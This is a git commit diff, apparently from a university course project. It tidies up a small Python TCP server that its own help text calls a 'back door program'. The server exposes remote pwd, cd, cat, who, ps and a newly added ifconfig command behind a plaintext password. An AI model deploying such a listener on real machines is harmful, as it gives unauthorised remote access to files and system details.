95d735af125f0fb8e9ca375416540669bf8558db
mmpop <mmpop@ucalgary.ca>
2017-01-28 11:17:32 -0700

    clean up

--- main.py
+++ main.py
@@ -24,10 +24,14 @@ def pwd_com():
     resp = os.getcwd()
     return (resp+"\n")
 
-#assumed that the path is relative
+
 def cd_com(relPath):
-    cwd=os.getcwd()
-    path=os.path.join(cwd,relPath)
+    cwd = os.getcwd()
+    if relPath[0]=='/':
+        path = relPath #arguments is an absolute path
+    else:
+        path = os.path.join(cwd,relPath) #argumment is a relative path
+
     try:
         os.chdir(path)
         return("dir changed to "+path+"\n")
@@ -40,10 +44,13 @@ def hlp_com():
             +"off - terminates the back door program\n")
 
 def who_com():
-    return(subprocess.check_output(["/bin/who"]).decode("utf-8"))
+    return(subprocess.check_output(["/bin/who"]).decode("utf-8")) #command must be located in /bin
 
 def ps_com():
-    return (subprocess.check_output(["/bin/ps"]).decode("utf-8"))
+    return (subprocess.check_output(["/bin/ps"]).decode("utf-8")) #command must be located in /bin
+
+def net_com():
+    return (subprocess.check_output(["/sbin/ifconfig"]).decode("utf-8")) #command must be located in /sbin
 
 def off_com():
     return ("client disconnect\n")
@@ -52,7 +59,7 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
    BUFFER_SIZE = 4096
    def handle(self):
        print("hi")
-       authorized = False
+       authorized = False #authorization flag
        self.request.sendall(bytearray(passwordRequest, "UTF-8"))
 
        while 1:
@@ -67,11 +74,14 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
            if len(data) == 0:
                continue
            data = data.decode( "utf-8")
-
+            #checks to see if the password has already been checked
            if not authorized:
                authorized = (data == password)
                if not authorized:
                    print(data)
+                   ##disconnect if password is not known
+                   if (data == "off\n"):
+                       break
                    self.request.sendall(bytearray(incorrectPw, "UTF-8"))
                    continue
                else:
@@ -113,15 +123,17 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
                     'ps\n':ps_com,
                     'off\n':off_com,
                     'cd':cd_com,
-                    'cat':cat_com}
+                    'cat':cat_com,
+                     'net\n':net_com}
 
+           #check the dictionary to see if the commmand exists and call the according function
            try:
                if dir:
                    response = option[data](dir)
                else:
                    response = option[data]()
            except:
-               response = ("No such Function\n")
+               response = ("Command not Found\n")
 
            self.request.sendall(bytearray(response,"UTF-8"))
            print("%s (%s) wrote: %s" % (self.client_address[0],
